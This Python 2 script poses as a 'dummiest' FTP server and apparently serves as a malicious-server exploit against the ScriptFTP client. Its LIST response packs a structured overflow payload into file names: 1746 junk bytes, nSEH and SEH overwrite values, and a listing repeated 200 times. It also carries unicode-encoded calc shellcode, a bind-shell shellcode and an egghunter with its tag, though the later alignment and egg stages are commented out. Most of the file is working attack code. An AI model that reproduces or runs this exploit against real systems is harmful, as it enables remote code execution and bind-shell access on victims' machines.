import socket
import os


class ftp_server:

    def __init__(self):

        self.host = '0.0.0.0'
        self.passive_port = 7214


        self.log("""Dummiest FTP Server""")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(('', 21))
        self.sock.listen(1)

        a = self.passive_port/256
        b = self.passive_port%256
        self.tuple_port = (a, b)
        self.host_join = ','.join(self.host.split('.'))
        self.passive = False

        self.log("Server initiated.")

    def log(self, msg):
        print msg

    def get(self):
        return self.conn.recv(1024).replace('\r', '').replace('\n', '')

    def getcwd(self):
        return os.getcwd().split(chr(92))[-1]

    def put(self, ftr):
        x = {

            150:" Data connection accepted from %s:%s; transfer starting.\r\n226 Listing completed."%(self.host, self.passive_port),
            200:" Type okay.",
            220:" %s Server is ready."%self.host,
            226:" Listing completed.",
            227:" Entering Passive Mode (%s,%s,%s)"%(self.host_join, self.tuple_port[0], self.tuple_port[1]),
            230:" User logged in, proceed.",
            250:' "/%s" is new cwd.'%self.getcwd(), 
            257:' "/%s" is cwd.'%self.getcwd(),
            331:" User name okay, need password.",
            502:" Command not implemented.",
            551:" Requested action aborted. Page type unknown." 
            
                   }[ftr]

        s = '%s%s\r\n'%(ftr, x)
        self.conn.send(s)
        return s
   
    def main(self):
        self.log("Awaiting a connection...\n")
        self.conn, addr = self.sock.accept ()
        self.log("Connection created by %s.\nEstablishing session."%addr[0])
        self.put(220)
        self.log("\nStarting Instruction Loop.")

        while 1:
            # if self.passive:
            #     try:
            #         data = self.conn2.recv(1024)
            #         print data
            #     except socket.error:
            #         pass 

                
            try: 
                data = self.get().upper()
            except socket.error:
                self.log("\n-- Connection Reset, shutting down FTP.\n ")
                self.conn.close()
                self.sock.shutdown(socket.SHUT_RDWR)
                raise socket.error
                
            self.log(" >>> %s"%data) 

            if data[:4] == 'USER':   s = 331
            elif data[:4] == 'PASS': s = 230
            elif data[:3] == 'PWD':  s = 257
            elif data[:4] == 'TYPE':
                s = 200
                # self.type = data.split(' ')[-1]
            elif data[:4] == 'PASV':
                # create passive port
                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock2.bind(('', self.passive_port ))
                self.sock2.listen(1)
                # self.sock2.settimeout(1)
                s = self.put(227)
                self.log(" <<< %s"%s)
                self.log("     [Connecting to passive port %s]"%self.passive_port)
                self.conn2, addr = self.sock2.accept()
                self.passive = True
                self.log("     [Connected]\n") 
                s = 0 # don't routine
      
            elif data[:3] == 'CWD':
                try:
                    os.chdir('..%s'%data.split(' ')[-1])
                    s = 250
                except OSError: 
                    s = 551
            elif data[:4] == 'LIST':
                s = self.put(150)
                self.log(" <<< %s"%s)

                s = self.passive_do(1)
                self.log(" >>> %s"%s)

                # s = self.put(226)
                # self.log(" >>> %s"%s)

                # print "<<< "+ self.conn2.recv(1024)

                s = 0 # don't routine
            else:                    s = 502
    
            if s:
                s = self.put(s)
                self.log(" <<< %s"%s)

    def passive_do(self, id):

        if id == 1:
	    #dummy shellcode
	    calc = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11A"
            "IAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLK8SYKPM0KPQ"
            "PU9K5NQJ2344KQB004KPRLL4KPRLTDKCBMXLOWGPJO6NQKONQ7PVLOL1QSLKRNLMP7QXOLMKQ7W"
            "K2ZP0R0WTKR2LPTKOROLKQXPTKOPRXU590T4PJM18PPPTKQ8LXTK28MPM1J3K3OLQ9TKP4DKKQJ"
            "601KONQWPVLY1XOLMM18G08YP2UJTKSSMZXOKSMMTSEZBPXTKB8O4KQ8S2F4KLLPKTKQHMLKQ9C"
            "4KM44KKQ8PTIOTNDO41KQK1Q1IQJ0QKOK0PXQOPZTKN2JK3VQM1ZKQ4MTEVYKPKPKP20QXP1TK2"
            "O4GKOXUGKZPVUER0VBHW6TUWMUMKO8UOLM63LKZ50KK9PBULEGKOWN3CBROQZKP0SKOZ533QQBL"
            "QSKPA")

	    bind = (
	    "\x89\xe5\xda\xc8\xd9\x75\xf4\x5e\x56\x59\x49\x49\x49\x49\x43"
	    "\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
	    "\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
	    "\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
	    "\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x5a\x48\x4c\x49\x45\x50"
	    "\x43\x30\x43\x30\x45\x30\x4d\x59\x4d\x35\x56\x51\x49\x42\x45"
	    "\x34\x4c\x4b\x56\x32\x56\x50\x4c\x4b\x50\x52\x54\x4c\x4c\x4b"
	    "\x51\x42\x45\x44\x4c\x4b\x54\x32\x47\x58\x54\x4f\x4f\x47\x51"
	    "\x5a\x56\x46\x50\x31\x4b\x4f\x50\x31\x4f\x30\x4e\x4c\x47\x4c"
	    "\x43\x51\x43\x4c\x43\x32\x56\x4c\x51\x30\x49\x51\x58\x4f\x54"
	    "\x4d\x45\x51\x58\x47\x4d\x32\x5a\x50\x50\x52\x50\x57\x4c\x4b"
	    "\x56\x32\x54\x50\x4c\x4b\x47\x32\x47\x4c\x43\x31\x58\x50\x4c"
	    "\x4b\x47\x30\x43\x48\x4c\x45\x4f\x30\x43\x44\x50\x4a\x45\x51"
	    "\x58\x50\x50\x50\x4c\x4b\x50\x48\x54\x58\x4c\x4b\x51\x48\x51"
	    "\x30\x45\x51\x4e\x33\x4b\x53\x47\x4c\x51\x59\x4c\x4b\x50\x34"
	    "\x4c\x4b\x43\x31\x4e\x36\x50\x31\x4b\x4f\x56\x51\x4f\x30\x4e"
	    "\x4c\x4f\x31\x58\x4f\x54\x4d\x43\x31\x4f\x37\x50\x38\x4b\x50"
	    "\x52\x55\x5a\x54\x54\x43\x43\x4d\x4c\x38\x47\x4b\x43\x4d\x47"
	    "\x54\x54\x35\x5a\x42\x51\x48\x4c\x4b\x51\x48\x51\x34\x45\x51"
	    "\x49\x43\x45\x36\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x56\x38\x45"
	    "\x4c\x45\x51\x49\x43\x4c\x4b\x54\x44\x4c\x4b\x43\x31\x4e\x30"
	    "\x4d\x59\x50\x44\x47\x54\x56\x44\x51\x4b\x51\x4b\x45\x31\x51"
	    "\x49\x51\x4a\x50\x51\x4b\x4f\x4b\x50\x56\x38\x51\x4f\x50\x5a"
	    "\x4c\x4b\x54\x52\x5a\x4b\x4d\x56\x51\x4d\x43\x58\x50\x33\x56"
	    "\x52\x45\x50\x45\x50\x43\x58\x54\x37\x54\x33\x50\x32\x51\x4f"
	    "\x50\x54\x45\x38\x50\x4c\x52\x57\x47\x56\x45\x57\x4b\x4f\x49"
	    "\x45\x58\x38\x5a\x30\x43\x31\x45\x50\x45\x50\x47\x59\x58\x44"
	    "\x50\x54\x50\x50\x45\x38\x56\x49\x4b\x30\x52\x4b\x45\x50\x4b"
	    "\x4f\x58\x55\x56\x30\x50\x50\x56\x30\x50\x50\x51\x50\x56\x30"
	    "\x51\x50\x56\x30\x45\x38\x4b\x5a\x54\x4f\x49\x4f\x4b\x50\x4b"
	    "\x4f\x4e\x35\x4d\x59\x4f\x37\x50\x31\x49\x4b\x51\x43\x52\x48"
	    "\x54\x42\x45\x50\x54\x51\x51\x4c\x4b\x39\x5a\x46\x43\x5a\x52"
	    "\x30\x56\x36\x51\x47\x43\x58\x4f\x32\x49\x4b\x50\x37\x45\x37"
	    "\x4b\x4f\x4e\x35\x51\x43\x50\x57\x52\x48\x4f\x47\x5a\x49\x50"
	    "\x38\x4b\x4f\x4b\x4f\x49\x45\x56\x33\x56\x33\x51\x47\x43\x58"
	    "\x52\x54\x5a\x4c\x47\x4b\x4b\x51\x4b\x4f\x58\x55\x50\x57\x4c"
	    "\x49\x49\x57\x52\x48\x52\x55\x52\x4e\x50\x4d\x45\x31\x4b\x4f"
            "\x49\x45\x45\x38\x43\x53\x52\x4d\x43\x54\x43\x30\x4b\x39\x4b"
	    "\x53\x50\x57\x51\x47\x50\x57\x50\x31\x4b\x46\x52\x4a\x45\x42"
            "\x56\x39\x50\x56\x4b\x52\x4b\x4d\x43\x56\x4f\x37\x50\x44\x56"
            "\x44\x47\x4c\x43\x31\x43\x31\x4c\x4d\x51\x54\x51\x34\x52\x30"
            "\x49\x56\x45\x50\x50\x44\x51\x44\x56\x30\x50\x56\x56\x36\x51"
            "\x46\x51\x56\x50\x56\x50\x4e\x56\x36\x50\x56\x56\x33\x51\x46"
            "\x45\x38\x54\x39\x58\x4c\x47\x4f\x4c\x46\x4b\x4f\x58\x55\x4c"
            "\x49\x4b\x50\x50\x4e\x56\x36\x50\x46\x4b\x4f\x50\x30\x52\x48"
            "\x43\x38\x4b\x37\x45\x4d\x45\x30\x4b\x4f\x49\x45\x4f\x4b\x5a"
            "\x50\x4e\x55\x4e\x42\x56\x36\x52\x48\x49\x36\x4d\x45\x4f\x4d"
            "\x4d\x4d\x4b\x4f\x4e\x35\x47\x4c\x43\x36\x43\x4c\x45\x5a\x4b"
            "\x30\x4b\x4b\x4b\x50\x52\x55\x43\x35\x4f\x4b\x47\x37\x45\x43"
            "\x54\x32\x52\x4f\x52\x4a\x45\x50\x51\x43\x4b\x4f\x4e\x35\x41"
	    "\x41")
	    # unicode encoded, egg="w00t"
	    egghunter = (
            "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ"
            "1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AY"
            "AZBABABABAB30APB944JBQVE1HJKOLOPB0RBJLBQHHMNNOLM5PZ44J"
            "O7H2WP0P0T4TKZZFOSEZJ6OT5K7KO9WA"
            )
	    #hunter tag ="w00tw00t"
	    egg = "\x77\x30\x30\x74\x77\x30\x30\x74";	
            #egghunter = w00tw00t	    
	    myegg =(
            "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ"
            "1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AY"
            "AZBABABABAB30APB944JBQV3QHJKOLOORQBRJKRPX8MNNOLKUQJ3DZ"
            "OFXPTP0NPR7TKKJVOSEZJFO3E9WKOZGA")
	    
	    payload = "A" * 1746	#junk
	    payload += "\x61\x60"	#nseh
            payload += "\x45\x5b" 	#seh ppr from scriptftp.exe 0x004F0042
            #prepare for align
#           payload += "\x60"			#pushad
#	    payload += "\x73"                   #nop/align
#           payload += "\x58"			#pop eax
#	    payload += "\x73"                   #nop/align
#           payload += "\x58"			#pop eax
#	    payload += "\x73"                   #nop/align
#           payload += "\x58"			#pop eax
#	    payload += "\x73"                   #nop/align
#	    payload += "\x05\x02\x11"     	#add eax,0x11000200
#	    payload += "\x73"             	#nop/align
#           payload += "\x2d\x01\x11"     	#sub eax,0x11000120
#	    payload += "\x73"             	#nop/align
	    
	    #jump to eax
#   	    payload  = "\x50"		    	#push eax
#	    payload += "\x73"            	#nop/align
#	    payload += "\xc3"			#ret
	    
#	    payload += "\x41" * 107		#eax+107
#	    payload += myegg
#	    payload += "\x41" * 500

#	    payload += egg
#	    payload += bind

#	    sisa = "\x45" * (total - len(junk+nseh+seh+prepare+jump+padding+egghunter+'w00tw00t'+bind))
#	    payload = junk+nseh+seh+prepare+jump+padding+myegg+'w00tw00t'+bind
            res = """-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 """+payload+""".txt\r\ndrwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 A\r\nrwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 """+ payload +".txt\r\n"
	    junk2 = res * 200

        self.conn2.send(junk2)
        # self.conn2.send('\r\n') # send blank
	return junk2

                
while 1:       
    try:
        ftp_server().main()
    except socket.error:
        print "Rebooting server...\n"
